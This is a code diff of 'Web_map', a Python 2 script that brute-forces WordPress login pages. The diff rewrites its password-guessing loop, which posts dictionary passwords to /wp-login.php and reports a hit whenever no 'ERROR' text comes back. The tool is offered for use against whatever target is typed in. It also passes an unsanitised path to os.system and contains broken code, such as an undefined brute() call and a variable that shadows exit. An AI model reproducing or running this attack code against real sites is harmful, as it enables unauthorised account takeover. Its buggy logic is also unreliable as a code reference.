@@ -1,6 +1,13 @@
 #! /usr/bin/env python
 ############ Web_map by L00PeR 2017 #################
 ############ Using brute-force technique      #################
+
+
+# Saturday, 4th of May of 2017: Wordpress login has been fixed thanks to @WHGhost
+
+
+
+
 try:
 	import os
 except:
@@ -18,7 +25,7 @@ except:
 	os.system("sudo pip install requests")
 
 def title():
-	version = "1.00"
+	version = "1.10"
 	print"\n\n"
 	print "--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*\n"
 	print "|      |  ______   |                  |\\      /|       /\      ______ "
@@ -134,29 +141,30 @@ def scan_4_wp_page(tgt):
 	else:
 		return False
 def brute_login(tgt, dictionary):
-	s = requests.Session()
-	pass_found = False
 	
-	user = raw_input("User: ")
-	intent = 0
-	tgt = tgt+"/wp-login"
-	f = open(dictionary, 'r')
-	for word in f.readlines():
-		password = word.strip('\n')
-		intent+=1
-		payload = {'log': user, 'pwd': password, 'wp-submit': 'Acceder', 'testcookie': '1'}
-		print '[+] Trying with user: '+str(user)+' and password: '+str(password)+'\ttry: '+str(intent)
-		s.post(tgt, data=payload)
-		data = s.get("http://gerion.info/wp-admin").text
-		if 'Escritorio' in data or 'Desktop' in data:
-			print '[*] Password found: '+password
-			pass_found = True
-		else:
-			pass
-			
-	if pass_found == False:
-		print "[-] Any password found"
+    s = requests.Session()
 
+    s.get(tgt)
+
+    user = raw_input("User: ")
+    intent = 0
+    tgt = tgt + "/wp-login.php"
+
+    passwords = []
+    with open(dictionary, 'r') as f:
+        passwords = f.read().rsplit('\n')
+
+    for password in passwords:
+        intent += 1
+        payload = {'log': user,'pwd': password}
+        print'[+] Trying with user: %s and password: %s\ttry: %s' % (user, password, intent)
+
+        data = s.post(tgt, data=payload)
+
+        
+        if not 'ERROR' in data.text:
+            print '[*] Password found: '+password
+            exit(0)
 
 def main():
 	title()
@@ -172,48 +180,53 @@ def main():
 				print "[-] Host is down"
 				exit(0)
 			if scan_4_brute_force(tgt) == True:
+				exit = True
 				dictionary = raw_input("Please type the path to the passwords dictionary: ")
 				brute_login(tgt,dictionary)
-				exit(0)
+				
 			else:
 				print "[-] The target is not a Wordpress site so cannot be brute-forced"
 				exit(0)
 	except:
 		pass
-
-	print "Program will save the logs on /bin/web-map/logs.txt"
-	chng_logs = raw_input("Do you want to change the path? Y/n ")
-	if chng_logs == 'y' or chng_logs == 'Y':
-		new_path = raw_input("Type the new path: ")
-		try:
-			open(new_path, "r")
-			print "[+] Path succesfully changed to: "+logs_path
-		except:
-			print "[-] Could not find the file,\n"
-			create = raw_input("Do you want to create it? Y/n ")
-			if create == 'y' or create == 'Y':
-				try:
-					os.system("nano "+new_path)
-					print "[+] File: "+new_path+" created!"
-				except:
-					print '[-] Could not create the file,\nplese try to create it manually'
-					quit = raw_input("Do you want to quit the program? Y/n ")
-					if quit == 'y' or quit == 'Y':
-						exit(0)			
-		logs_path = new_path
-	tgt = raw_input("SELECT TARGET  [>>] ")
-	test = test_connection(tgt)
-	if test == 1:
-		print "[+] Host: "+tgt+" is up and ready to be scanned"
-	else:
-		print "[!] WARNING, Host: "+tgt+" is down!"
-		exit(0)
-	scan_4_wp_page(tgt)
-	start_with_the_brute_force=  raw_input("[*] Configurations are correct,\n do you want to start with the brute-forcing? Y/n ")
-	if start_with_the_brute_force == 'y' or start_with_the_brute_force == 'Y':
-		brute(tgt)
-	else:
-		print "[-] Quitting"
-		exit(0)
+		
+	try:
+		print "Program will save the logs on /bin/web-map/logs.txt"
+		chng_logs = raw_input("Do you want to change the path? Y/n ")
+	
+		if chng_logs == 'y' or chng_logs == 'Y':
+			new_path = raw_input("Type the new path: ")
+			try:
+				open(new_path, "r")
+				print "[+] Path succesfully changed to: "+logs_path
+			except:
+				print "[-] Could not find the file,\n"
+				create = raw_input("Do you want to create it? Y/n ")
+				if create == 'y' or create == 'Y':
+					try:
+						os.system("nano "+new_path)
+						print "[+] File: "+new_path+" created!"
+					except:
+						print '[-] Could not create the file,\nplese try to create it manually'
+						quit = raw_input("Do you want to quit the program? Y/n ")
+						if quit == 'y' or quit == 'Y':
+							exit(0)			
+			logs_path = new_path
+		tgt = raw_input("SELECT TARGET  [>>] ")
+		test = test_connection(tgt)
+		if test == 1:
+			print "[+] Host: "+tgt+" is up and ready to be scanned"
+		else:
+			print "[!] WARNING, Host: "+tgt+" is down!"
+			exit(0)
+		scan_4_wp_page(tgt)
+		start_with_the_brute_force=  raw_input("[*] Configurations are correct,\n do you want to start with the brute-forcing? Y/n ")
+		if start_with_the_brute_force == 'y' or start_with_the_brute_force == 'Y':
+			brute(tgt)
+		else:
+			print "[-] Quitting"
+			exit(0)
+	except:
+		pass
 if __name__ == '__main__':
 	main()
